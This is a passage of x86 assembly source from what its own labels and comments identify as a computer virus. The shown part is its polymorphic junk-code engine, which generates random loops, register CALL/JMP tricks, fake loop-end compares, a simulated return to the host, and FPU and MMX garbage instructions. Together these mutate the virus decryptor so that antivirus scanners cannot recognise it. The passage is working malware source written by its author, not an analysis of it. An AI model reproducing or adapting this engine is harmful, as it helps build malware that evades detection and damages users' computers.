           ; we can't be recursived because ECX is only for one LOOP
           cmp byte ptr [ebp+recursive_level-virus_start],1
           jnz a_loop

           ; does ECX free ?
           test    byte ptr [ebp+used_regs-virus_start],00000010b
           jnz a_loop

           ; generate ECX like counter
           mov eax,00000030h       ;future ECX to loop
           call    ppe_get_rnd_range
           add eax,2
           mov bl,00000001b        ;write to ECX
           call    ppe_crypt_value

           ; we don't want to change ECX
           or  byte ptr [ebp+used_regs-virus_start],00000010b

           push    edi         ;total garbages in bytes
           call    gen_garbage_based   ;to calculate loop
           pop eax
           sub eax,edi
           sub eax,2           ;loop has two bytes

           mov ah,0E2h         ;loop identification
           xchg    ah,al
           stosw

           ; enable ECX
           and byte ptr [ebp+used_regs-virus_start],11111101b

   a_loop:     ret

   ;ÄÄÄ´ generate reg + garbage + dec reg + jnz reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   ÀÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÙ

           g_lj_reg    db  ?   ;0=8bit, 1=16bit, 2=32bit
           g_lj_reg_past   db  ?   ;0=low, 1=high (8BIT only)

   g_loop_jump:

           ; we can't be recursived because ECX is only for one LOOP_JUMP
           cmp byte ptr [ebp+recursive_level-virus_start],1
           jnz a_loop_jump

           ; select a free register
           call    ppe_get_empty_reg
           mov byte ptr [ebp+g_lj_reg-virus_start],0   ;8 bit ...
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz __g_lj_no_8bit
           mov eax,00000001h               ;hi, lo ?
           call    ppe_get_rnd_range
           mov byte ptr [ebp+g_lj_reg_past-virus_start],al
           jmp __g_lj_okay

           ; choose between reg16 and reg32
       __g_lj_no_8bit:
           mov eax,00000002h       ;reg16 or reg32 ?
           call    ppe_get_rnd_range
           inc eax
           mov byte ptr [ebp+g_lj_reg-virus_start],al

       __g_lj_okay:
           push    ebx
           mov eax,00000030h       ;how many to looping ?
           call    ppe_get_rnd_range
           add eax,2
           mov bl,byte ptr [ebx]   ;used reg
           call    ppe_crypt_value

           pop ebx
           push    ebx
           mov al,byte ptr [ebx]   ;disable register
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah

           push    edi
           call    gen_garbage_based
           pop ecx

           mov ax,4866h        ;dec (reg16-clone)
           or  ah,byte ptr [ebx]
           cmp byte ptr [ebp+g_lj_reg-virus_start],0
           jz  __g_lj_dec_8bit
           cmp byte ptr [ebp+g_lj_reg-virus_start],2
           jz  __g_lj_dec_32bit
           stosb
       __g_lj_dec_32bit:
           xchg    ah,al
           stosb
           jmp __g_lj_dec_finish
       __g_lj_dec_8bit:
           mov ax,0C8FEh       ;dec (reg8)
           or  ah,byte ptr [ebx]   ;certain reg
           cmp byte ptr[ebp+g_lj_reg_past-virus_start],1
           jz  __g_lj_dec_8bit_high
           stosw
           jmp __g_lj_dec_finish
       __g_lj_dec_8bit_high:
           and ah,24h
           stosw

       __g_lj_dec_finish:
           call    gen_garbage_no_flags
           pop ebx

           mov al,byte ptr [ebx]   ;certain reg
           call    __reg_to_bcd
           not ah
           and byte ptr [ebp+used_regs-virus_start],ah

           mov ax,850Fh        ;JNZ identification
           stosw

           mov eax,ecx
           sub eax,edi
           sub eax,4
           stosd

   a_loop_jump:    ret

   ;ÄÄÄ´ generate reg32 + call reg32 + rnd_block + pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function can generate CALL reg32 which will be gene-
           ;rated by <ppe_crypt_value>.
           ;
           g_cr32_reg  db  ?
           g_cr32_full db  ?   ;0=g_return,1=call,2=jump
           g_cr32_jump dd  ?   ;address of CALL instruction
           ;
   g_call_reg32:

           mov byte ptr [ebp+g_cr32_full-virus_start],1

   b_call_reg32:
           mov dword ptr [ebp+g_cr32_jump-virus_start],00000000h

           ; test, if global index reg is generated
           cmp byte ptr [ebp+gl_index_reg-virus_start],-1
           jz  a_call_reg32

           ; do not recursived - because it's few registers
           cmp byte ptr [ebp+recursive_level-virus_start],1
           jnz a_call_reg32

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; select an empty register
           call    ppe_get_empty_reg
           movzx   ebx,byte ptr [ebx]
           mov byte ptr [ebp+g_cr32_reg-virus_start],bl

           ; calculate size of rnd_block
           mov eax,00000030h
           call    ppe_get_rnd_range
           add eax,00000005h       ;damn, fucking BUG !!
           push    eax         ;save it for later use
           jmp d_call_reg32
   c_call_reg32:
           mov byte ptr [ebp+g_cr32_full-virus_start],0
           mov cl,[ebp+used_regs-virus_start]
           push    cx
           mov bl,byte ptr [ebx]
           mov byte ptr [ebp+g_cr32_reg-virus_start],bl
   d_call_reg32:
           call    ppe_crypt_value     ;ebx is full
           movzx   eax,byte ptr [ebp+g_cr32_reg-virus_start]
           lea ebx,[ebp+tbl_regs+02h*eax-virus_start]
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           call    gen_garbage_no_flags    ;uaaahh
           call    __copro_fix_delta   ; + global index register
           call    gen_garbage_no_flags

           ; for <g_iluzo_return> we don't want to set right size
           cmp byte ptr [ebp+g_cr32_full-virus_start],0
           jz  e_call_reg32

           ; set the right size
           mov ebx,edi
           add ebx,2+6         ; + call reg32 + (add/sub)
           sub ebx,[ebp+poly_start-virus_start]
           mov eax,00000002h
           call    ppe_get_rnd_range
           or  al,al
           jz  __cr32_add
           neg ebx
           mov ax,0E881h       ;sub reg32,imm32 id
           jmp __cr32_finish
       __cr32_add:
           mov ax,0C081h       ;add reg32,imm32 id
       __cr32_finish:
           or  ah,byte ptr [ebp+g_cr32_reg-virus_start]
           stosw
           mov eax,ebx
           stosd
   e_call_reg32:
           ; now, write CALL reg32 instruction
           mov ax,0D0FFh
           or  ah,byte ptr [ebp+g_cr32_reg-virus_start]
           stosw
           mov [ebp+g_cr32_jump-virus_start],edi

           cmp byte ptr [ebp+g_cr32_full-virus_start],0
           jz  f_call_reg32

           pop ecx         ;rnd_block length
           call    ppe_gen_rnd_fill    ;ecx is full

           cmp byte ptr [ebp+g_cr32_full-virus_start],2
           jz  f_call_reg32

           ; and we must put value from stack via POP reg32
           call    gen_garbage_no_flags    ;uaaahh...
           mov al,58h
           or  al,byte ptr [ebp+g_cr32_reg-virus_start]
           stosb
   f_call_reg32:
           ; restore used_regs
           pop ax
           mov [ebp+used_regs-virus_start],al

   a_call_reg32:   ret

   ;ÄÄÄ´ generate reg32 + jump reg32 + rnd_block ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_jump_reg32:

           mov byte ptr [ebp+g_cr32_full-virus_start],2

           ; write CALL reg32 garbage
           call    b_call_reg32
           cmp dword ptr [ebp+g_cr32_jump-virus_start],0
           jz  a_jump_reg32

           ; rewrite CALL reg32 --> JMP reg32
           mov eax,[ebp+g_cr32_jump-virus_start]
           add byte ptr [eax-1],10h    ;CALL reg32 -> JMP reg32

   a_jump_reg32:
           ret

   ;ÄÄÄ´ generate rep/repnz + cmps/lods/stos/scas/movs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÄÙ

           ;---------------------------------------------------------
           ;Welcome to my popular function. I think any comment is
           ;needless - because this function is easy to understand.
           ;So, If u don't believe me, I'll show you some functionz:
           ;  * __gr_make_esi   ---   generate source
           ;  * __gr_make_edi   ---   generate destination or source
           ;  * __gr_make_ecx   ---   generate counter
           ;
           ;...easy to understand...
           ;
   g_repeat:

           ; test, if global index register is generated
           cmp byte ptr [ebp+gl_index_reg-virus_start],-1
           jz  a_repeat

           ; i must be far then about USED_MEMORY bytes
           call    __gr_where_in_mem
           jc  a_repeat

           ; register ECX must be free
           test    byte ptr [ebp+used_regs-virus_start],00000010b
           jnz a_repeat

           ; does ESI free ?
           test    byte ptr [ebp+used_regs-virus_start],01000000b
           jnz __gr_part_2

           ; does EDI free ?
           test    byte ptr [ebp+used_regs-virus_start],10000000b
           jnz __gr_lods

           ; all cmps/lods/stos/scas/movs, wow !
           mov eax,(end_repeat - tbl_repeat) / 04h
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_repeat+eax*04h-virus_start]
           lodsd
           add eax,ebp
           sub eax,offset virus_start
           call    eax
           jmp a_repeat

       __gr_part_2:
           ; must be EDI free ...
           test    byte ptr [ebp+used_regs-virus_start],10000000b
           jnz a_repeat

           ; only stos/scas ....
           mov eax,00000002h
           call    ppe_get_rnd_range
           or  al,al
           jz  __gr_stos
           jmp __gr_scas

       __gr_cmps:
           call    __gr_make_esi       ;new esi to ebx
           call    __gr_make_edi       ;new edi to ecx
           call    __gr_change

           push    ecx
           mov eax,ebx
           mov bl,00000110b        ;esi register
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+6*2-virus_start]
           call    __copro_fix_delta
           or  byte ptr [ebp+used_regs-virus_start],01000000b
           pop eax
           mov bl,00000111b        ;edi register
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+7*2-virus_start]
           call    __copro_fix_delta
           or  byte ptr [ebp+used_regs-virus_start],10000000b

           call    __gr_crypt_ecx      ;ecx register
           call    __gr_make_rep       ;rep or repnz ?
           mov al,0A6h
           stosb
           and byte ptr [ebp+used_regs-virus_start],00111111b
           ret

       __gr_lods:
           ; register EAX must be free
           test    byte ptr [ebp+used_regs-virus_start],00000001h
           jnz __gr_flods
           call    __gr_make_esi

           mov eax,ebx
           mov bl,00000110b
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+6*2-virus_start]
           call    __copro_fix_delta
           or  byte ptr [ebp+used_regs-virus_start],01000000b

           call    __gr_crypt_ecx
           call    __gr_make_rep
           mov al,0ACh
           stosb
           and byte ptr [ebp+used_regs-virus_start],10111111b
       __gr_flods:
           ret

       __gr_stos:
           call    __gr_make_edi

           mov eax,ecx
           mov bl,00000111b
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+7*2-virus_start]
           call    __copro_fix_delta
           or  byte ptr [ebp+used_regs-virus_start],10000000b

           call    __gr_crypt_ecx
           call    __gr_make_rep
           mov al,0AAh
           stosb
           and byte ptr [ebp+used_regs-virus_start],01111111b
           ret

       __gr_scas:
           call    __gr_make_edi
           or  byte ptr [ebp+used_regs-virus_start],10000000b

           mov eax,ecx
           mov bl,00000111b
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+7*2-virus_start]
           call    __copro_fix_delta

           call    __gr_crypt_ecx
           call    __gr_make_rep
           mov al,0AEh
           stosb
           and byte ptr [ebp+used_regs-virus_start],01111111b
           ret

       __gr_movs:
           call    __gr_make_esi
           call    __gr_make_edi
           call    __gr_change

           push    ecx
           mov eax,ebx
           mov bl,000000110b
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+6*2-virus_start]
           call    __copro_fix_delta
           or  byte ptr [ebp+used_regs-virus_start],01000000b
           pop eax
           mov bl,000000111b
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+7*2-virus_start]
           call    __copro_fix_delta
           or  byte ptr [ebp+used_regs-virus_start],10000000b

           call    __gr_crypt_ecx
           call    __gr_make_rep
           mov al,0A4h
           stosb
           and byte ptr [ebp+used_regs-virus_start],00111111b
           ret

       __gr_make_rep:
           mov bx,0F2F3h       ;repnz, rep
           mov eax,00000002h
           call    ppe_get_rnd_range
           xchg    eax,ebx
           or  bl,bl
           jz  __gr_make_repnz
           stosb
           ret
       __gr_make_repnz:
           xchg    ah,al
           stosb
           ret

       __gr_crypt_ecx:
           mov eax,30
           call    ppe_get_rnd_range
           mov bl,00000001b        ;ecx register
           call    ppe_crypt_value
           ret

       __gr_make_esi:
           mov eax,0000000Ah       ;esi start
           call    ppe_get_rnd_range
           mov ebx,eax
           sub ebx,edi
           add ebx,[ebp+poly_start-virus_start]
           ret

       __gr_make_edi:
           mov eax,000000Ah        ;edi start
           call    ppe_get_rnd_range
           mov ecx,eax
           sub ecx,edi
           add ecx,[ebp+poly_start-virus_start]
           ret

       __gr_change:
           mov eax,00000002h       ;change esi and edi ?
           call    ppe_get_rnd_range
           or  al,al
           jz  __gr_change_no
           xchg    ebx,ecx
       __gr_change_no:
           ret

       __gr_where_in_mem:
           mov eax,[ebp+poly_start-virus_start]
           sub eax,edi
           neg eax
           cmp eax,USED_MEMORY
           ret

   a_repeat:   ret

   ;ÄÄÄ´ generate push value(32/16)/garbage/pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_pushpop_value:

           ; value32 OR value16 ?
           call    ppe_get_rnd32       ;save dword or word ?
           and al,1
           jnz __ppv_push16

           ; short or long value ?
           call    ppe_get_rnd32
           and al,1
           jnz __ppv_push32_short

           ; long value
           mov al,68h          ;save: PUSH 11223344h
           stosb               ;code:  68  44332211
           call    ppe_get_rnd32
           stosd
           jmp __ppv_finish32
       __ppv_push32_short:
           call    ppe_get_rnd32       ;save: PUSH 00000009h
           mov al,6Ah          ;code:  6A     09
           stosw
           jmp __ppv_finish32
       __ppv_push16:
           call    ppe_get_rnd32
           and al,1
           jnz __ppv_push16_short

           ; long short-value
           mov ax,6866h
           stosw
           call    ppe_get_rnd32
           stosw
           jmp __ppv_finish16
       __ppv_push16_short:
           mov ax,6A66h
           stosw
           call    ppe_get_rnd32
           stosb
           jmp __ppv_finish16

           ; time to POP value
       __ppv_finish32:
           call    gen_garbage_based   ;POP reg32
           call    ppe_get_empty_reg
           mov al,58h
           or  al,byte ptr [ebx]
           stosb
           jmp __ppv_finish
       __ppv_finish16:
           call    gen_garbage_based   ;POP reg16
           call    ppe_get_empty_reg
           mov ax,5866h
           or  ah,byte ptr [ebx]
           stosw

       __ppv_finish:
           ret

   ;ÄÄÄ´ function to crypt a random value to reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_crypt_value:

           call    ppe_get_empty_reg
           mov bl,al
           call    ppe_get_rnd32
           call    ppe_crypt_value

           ret

   ;ÄÄÄ´ function to simulate end of encode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function can generate "destination" compare like a
           ;bafflement. So, this garbage generate this code:
           ;
           ;   CALL        __pos_1     ;any garbages
           ;   <rnd_data>          ;typical CALL rnd_data
           ;  __i: JMP     __compare_back  ;  NEW JUMP
           ;   <rnd_data>          ;typical CALL rnd_data
           ;  __pos_1:
           ;   <next_code>         ;loop,next_index...
           ;   DEC     reg32       ;typical CMP instruction
           ;   <garbages>
           ;   CMP     reg32,reg32     ;compare registers
           ;   <garbages - no_flags>       ;no_flags garbages
           ;   JNZ     __i         ;typical CMP c-jump
           ;  __compare_back:          ;come back and continue
           ;   <next_code>
           ;
   g_compare:

           ; do not recursived - because it's few registers
           cmp byte ptr [ebp+recursive_level-virus_start],1
           jnz a_compare

           ; have we some free place in rnd_fill ?
           cmp byte ptr [ebp+compare_index-virus_start],0
           jz  a_compare

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    eax

           ; select a free base-reg to DEC
           call     gen_garbage_based
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov al,48h          ;DEC identification
           or  al,byte ptr [ebx]
           stosb               ;save DEC empty_reg32

           call    gen_garbage_based

           ; build CMP instruction
           mov edx,ebx
       __gc_new_reg:
           call    ppe_get_reg
           cmp ebx,edx         ;i don't want same regz
           jz  __gc_new_reg
           mov ah,byte ptr [edx]   ;reg to AH
           shl ah,3            ; * 8
           or  ah,al
           or  ah,0C0h
           mov al,3Bh          ;CMP identification
           stosw

           call    gen_garbage_no_flags

           ; build JNZ jmp
           mov ax,850Fh        ;JNZ far signature
           stosw
           movzx   eax,byte ptr [ebp+compare_index-virus_start]
           call    ppe_get_rnd_range   ;select <compare_index>
           mov eax,[ebp+compare_buffer+04h*eax-virus_start]
           add eax,[ebp+poly_start-virus_start]
           push    eax
           sub eax,edi
           sub eax,4
           stosd

           call    gen_garbage_based

           ; build JMP to rnd_fill
           pop ecx         ;EDI of rnd_fill_jmp in ECX
           mov al,0E9h         ;JMP far signature
           mov byte ptr [ecx],al
           mov eax,edi
           sub eax,ecx
           sub eax,5
           mov dword ptr [ecx+1],eax

           call    gen_garbage_based

           ; destroy all rnd_fill buffers
           mov byte ptr [ebp+compare_index-virus_start],00h

           ; restore used_regs
           pop eax
           mov [ebp+used_regs-virus_start],al

   a_compare:  ret

   ;ÄÄÄ´ function to simulate return to host ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   ÀÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÙ

           ;---------------------------------------------------------
           ;This is my special function to simulate end of decoding.
           ;Here is scheme:
           ;
           ;   <virus_decrypted_body>  ;this is decrypted part
           ;  __iluzo_return_1:        ;try to find it in this
           ;   JMP __back      ;file !
           ;   <virus_crypted_body>
           ;
           ;  __poly_start:        ;start of poly decoder
           ;   <some poly_code>    ;gen index,code...
           ;   <test_if_i_can_jump>    ;is <__iluzo_return_1>
           ;   <gen reg32 with __pos_1>;decrypted ? or not ?
           ;   JMP reg32
           ;  __back:
           ;   <next poly_code>
           ;
           ;By my tests I know for gen_garbage is only one empty base
           ;reg - it means I cannot read index_reg from copro/mmx regz
           ;because must be REG_NO_COPRO free.
           ;
           __g_ir_jump dd  ?   ;offs E9xxxx in virus-body
           __g_ir_compare  dd  ?   ;offs JNZ cjump
           ;

   g_iluzo_return:

           ; test, if global index reg is generated
           cmp byte ptr [ebp+gl_index_reg-virus_start],-1
           jz  a_iluzo_return

           ; we can't be recursived
           cmp byte ptr [ebp+recursive_level-virus_start],1
           jnz a_iluzo_return

           ; what and where to detect
           cmp byte ptr [ebp+index_reg-virus_start],0
           jnz a_iluzo_return
           cmp byte ptr [ebp+index_reg_get-virus_start],1
           jnz a_iluzo_return

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    eax

           ; select __iluzo_return label
       __g_ir_new_reg:
           mov eax,(end_iluzo_ret - tbl_iluzo_ret) / 04h
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_iluzo_ret+04h*eax-virus_start]
           lodsd
           sub eax,offset virus_start

           mov ebx,file_size
           sub ebx,eax
           mov [ebp+__g_ir_jump-virus_start],ebx

           ; select a free register
           call    ppe_get_empty_reg
           mov eax,[ebp+__g_ir_jump-virus_start]
           sub eax,00000020h       ;JMP far has got five bytes
           not eax
           movzx   ebx,byte ptr [ebx]
           call    ppe_crypt_value
           mov al,bl
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           lea ebx,[ebp+tbl_regs+02h*ebx-virus_start]
           call    __copro_fix_delta

           ; compare index and iluzo_index
           call    gen_garbage_based
           mov ah,byte ptr [ebx]
           shl ah,3
           or  ah,[ebp+index_reg_place-virus_start]
           or  ah,0C0h
           mov al,3Bh
           stosw
           call    gen_garbage_no_flags
           mov [ebp+__g_ir_compare-virus_start],edi
           add edi,6
           call    gen_garbage_based

           ; restore used-regs
           pop eax
           mov [ebp+used_regs-virus_start],al

           ; ready to CALL there
           mov eax,[ebp+__g_ir_jump-virus_start]
           dec eax
           not eax
           pusha
           call    c_call_reg32        ;edi-2 = call reg32 instr
           mov [esp],edi       ;actualize EDI register
           popa
           call    gen_garbage_based

           ; set JNB here
           mov edx,[ebp+__g_ir_compare-virus_start]
           mov eax,edi
           sub eax,edx
           sub eax,6
           mov word ptr [edx],830Fh
           mov [edx+2],eax

   a_iluzo_return:
           ret

   ;ÄÄÄ´ generate fld/fild/fld(pi,1,ln2,lg2,l2e,l2t,z) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function can save any value to copro-reg. It can be
           ;from memory (real or integer) or we can use pre-defined
           ;instruction like: fldpi,fldlg2,fldl2t,fldl2e and so on.
           ;I don't support addressing for ESP,EBP register because
           ;they've other code (two bytes) then standard (EAX,ECX...)
           ;
           ;input:     AL = copro-reg
           ;          ESI = offset of function (fldpi,...)
           ;
           __g_cm_test db  ?       ;cjmp placed ?
           ;
   g_copro_movin:
           ; test if we aren't too near
           call    __gr_where_in_mem
           jc  a_copro_movin

           ; use I mmx ? If yes, I can't use copro-garbage
           mov al,1
           call    __mmx_test_start
           mov byte ptr [ebp+__g_cm_test-virus_start],1

           ; select a random instruction
           mov eax,(end_copro_movin - tbl_copro_movin) / 03h
           call    ppe_get_rnd_range
           imul    eax,03h
           lea esi,[ebp+tbl_copro_movin+eax-virus_start]

           ; now, I'm gonna generate place in memory when I'll read
           ; It's because of compatibility with the next label
           call    __copro_get_mem

           ; select a free copro-reg
           call     ppe_get_empty_reg_copro
           jmp  d_copro_movin

           ; I can jump here if I'd like to save to copro-reg cartain
           ; value BUT I can call this function via other parent func.
   c_copro_movin:
           mov byte ptr [ebp+__g_cm_test-virus_start],0
   d_copro_movin:
           call    __copro_set     ;set copro-reg to ST(0)

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    ax

           mov eax,0C7DDF7D9h      ;FINCSTP
           stosd               ;FFREE ST(7)

           lodsb
           or  al,al           ;must I modify reg ?
           jz  __cm_fldx

       __cm_new_reg:               ;I don't want EBP,ESP
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __cm_new_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           push    ebx
           mov bl,byte ptr [ebx]
           mov eax,edx
           call    ppe_crypt_value     ;crypt address
           pop ebx

           call    __copro_fix_delta   ;EBX to input

           lodsw               ;instruction id
           or  ah,byte ptr [ebx]   ;set reg
           stosw
           jmp __cm_finish

       __cm_fldx:
           lodsw               ;pre-defined instructions
           stosw

       __cm_finish:
           call    __copro_reset       ;set ST(0) back
           pop ax
           mov [ebp+used_regs-virus_start],al

           ; test if I placed cjmp
           cmp byte ptr [ebp+__g_cm_test-virus_start],0
           jz  a_copro_movin
           call    __mmx_test_finish

   a_copro_movin:  ret

   ;ÄÄÄ´ generate fst/fist (word/dword/qword) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function loads any value from copro-reg to memory.
           ;If you will want to read value from ST(6) you can also
           ;call this function (c_copro_movout) and in AL you will
           ;have copro-reg (by tbl_regs table).
           ;
           ;input:     for c_copro_movout in AL copro-reg
           ;       ESI = offset of instruction
           ;output:    EAX = place of value in memory
           ;
           __g_cmout_test  db  ?       ;cjmp placed ?
           ;
   g_copro_movout:
           ; where we are in memory
           call    __gr_where_in_mem
           jc  a_copro_movout

           ; may I use copro-garbage when I'm using mmx ?
           mov al,1
           call    __mmx_test_start
           mov byte ptr [ebp+__g_cmout_test-virus_start],1

           ; select a random instruction
           mov eax,(end_copro_movout - tbl_copro_movout) / 02h
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_copro_movout+02h*eax-virus_start]

           ; select a free copro-reg
           call    ppe_get_empty_reg_copro
           jmp d_copro_movout
   c_copro_movout:
           mov byte ptr [ebp+__g_cmout_test-virus_start],0
   d_copro_movout:
           call    __copro_set     ;set copro-reg to ST(0)

       __cmo_new_reg:
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __cmo_new_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           push    ebx
           mov bl,byte ptr [ebx]
           call    __copro_get_mem
           mov eax,edx
           call    ppe_crypt_value
           pop ebx
           push    eax         ;eax = place of value in mem

           call    __copro_fix_delta

           lodsw
           or  ah,byte ptr [ebx]
           stosw

           call    __copro_reset       ;set ST(0) back

           ; enable register
           movzx   eax,byte ptr [ebx]
           call    __reg_to_bcd
           not ah
           and [ebp+used_regs-virus_start],ah

           pop eax         ;place of value in memory

           ; jump placed ?
           cmp byte ptr [ebp+__g_cmout_test-virus_start],0
           jz  a_copro_movout
           call    __mmx_test_finish

   a_copro_movout: ret

   ;ÄÄÄ´ generate fadd/fiadd/fsub/fisub (word/dword/qword - ST(x),ST) ÃÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function can generate simple math operation like is
           ;FADD, FIADD, FSUB, FISUB. I also know FDIV, FCOMP, FMUL,
           ;FIDIVR etc. but they use sometimes later... The very
           ;interesting instruction is (FADD,...) ST(x),ST which she
           ;works with ST(x) and ST (if ST=empty then ST(x)=FAIL !!)
           ;Also this function can be call from other parent function
           ;
           ;input:      AL = copro-reg
           ;       EDX = place of value in memory
           ;       ESI = offset of function (fadd,...)
           ;
           __g_cmath_test  db  ?       ;cjmp placed ?
           ;
   g_copro_math:
           ; where we are in memory
           call    __gr_where_in_mem
           jc  a_copro_math

           ; use copro-garbage, when I'm using mmx ?
           mov al,1
           call    __mmx_test_start
           mov byte ptr [ebp+__g_cmath_test-virus_start],1

           ; select a random function
           mov eax,(end_copro_math - tbl_copro_math) / 02h
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_copro_math+02h*eax-virus_start]

           ; now we choose a pleasent place in memory
           call    __copro_get_mem

           call    ppe_get_empty_reg_copro
           jmp d_copro_math
   c_copro_math:
           mov byte ptr [ebp+__g_cmath_test-virus_start],0
   d_copro_math:
           call    __copro_set

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; I must crypt address ...
       __cmath_new_reg:
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __cmath_new_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           push    ebx
           mov bl,byte ptr [ebx]
           mov eax,edx
           call    ppe_crypt_value     ;crypt address
           pop ebx

           call    __copro_fix_delta

           ; my new instruction ...
           lodsw
           or  ah,byte ptr [ebx]
           stosw

           call    __copro_reset

           pop ax
           mov [ebp+used_regs-virus_start],al

           ; jump placed ?
           cmp byte ptr [ebp+__g_cmath_test-virus_start],0
           jz  a_copro_math
           call    __mmx_test_finish

   a_copro_math:   ret

   ;ÄÄÄ´ generate fsin/fcos/fsincos/fpatan/fabs/frndint/ffree/fxch... ÃÄÄÄÄÄÄ

   g_copro_others:
           ; where we're in memory
           call    __gr_where_in_mem
           jc  a_copro_others

           ; use copro-garbage... ?
           mov al,1
           call    __mmx_test_start

           ; select a random instruction
           mov eax,(end_copro_others - tbl_copro_others) / 03h
           call    ppe_get_rnd_range
           imul    eax,03h
           lea esi,[ebp+tbl_copro_others+eax-virus_start]

           ; must I modify reg ?
           lodsb
           or  al,al
           jnz __co_modify_reg

           ; select a free reg
           call    ppe_get_empty_reg_copro
           call    __copro_set

           lodsw               ;load instruction to AX
           stosw

           call    __copro_reset
           call    __mmx_test_finish   ;here was bug !!
           ret

       __co_modify_reg:            ;only FFREE ST(x), FXCH ST(x)
           call    ppe_get_empty_reg_copro
           mov bl,al
           lodsw
           or  ah,bl           ;set a free copro-reg
           stosw

           call    __mmx_test_finish

   a_copro_others: ret

   ;ÄÄÄ´ generate fully 46 instructions of MMX ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This functions can generate many instructions for IA-MMX
           ;It's instructions for adding, subtractive, comparing ...
           ;oparations. I also know IA-MMX-2 instructions and MMX
           ;instructions for Cyrix CPU but I don't support them.
           ;The sutructure of one MMX instruction is following:
           ;
           ;   0Fh, byte from table, 0C0h + dest SHL 3 + src
           ;
           ;where dest is an empty MMX register and src is any
           ;
   g_mmx:

           ; does CPU support MMX ?
           mov al,0
           call    __mmx_test_start

           ; get any instruction
           mov eax,end_mmx_others - tbl_mmx_others
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_mmx_others+eax-virus_start]

           ; build one
           mov ah,0Fh          ;MMX identification
           lodsb               ;and not only one
           xchg    ah,al
           stosw

           ; get registers
           call    ppe_get_empty_reg_mmx
           push    ebx
           call    ppe_get_empty_reg
           pop edx
           mov al,byte ptr [edx]
           shl al,3
           or  al,byte ptr [ebx]
           or  al,0C0h
           stosb

           ; finish test
           call    __mmx_test_finish

           ret

   ;ÄÄÄ´ generate some garbage code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This main function can generate garbages from my great
           ;table. Function can be recursived but it can't generate
           ;copro garbages yet. You can set (garbage_style) if you
           ;wanna generate unmodify flags instructions.
           ;
   gen_garbage:

           inc byte ptr [ebp+recursive_level-virus_start]
           cmp byte ptr [ebp+recursive_level-virus_start],4
           jae gg_exit

           ; are registers full ?
           cmp byte ptr [ebp+used_regs-virus_start],0EFh
           jz  gg_exit

           pusha
           mov eax,00000004h
           call    ppe_get_rnd_range
           inc eax
           mov ecx,eax
       __gg_loop:
           push    ecx

           ; have I use unmodify flags instructions ?
           cmp byte ptr [ebp+garbage_style-virus_start],USED_FLAGS
           jnz __ggl_flags
           mov eax,(end_no_flags - tbl_no_flags) / 02h
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_no_flags+eax*02h-virus_start]
           lodsb
           call    ppe_get_rnd_range
           add al,[esi]
           call    __gg_test
           jc  __gg_finish
           lea esi,[ebp+tbl_garbage+04h*eax-virus_start]
           mov eax,[esi]
           jmp __gg_jump

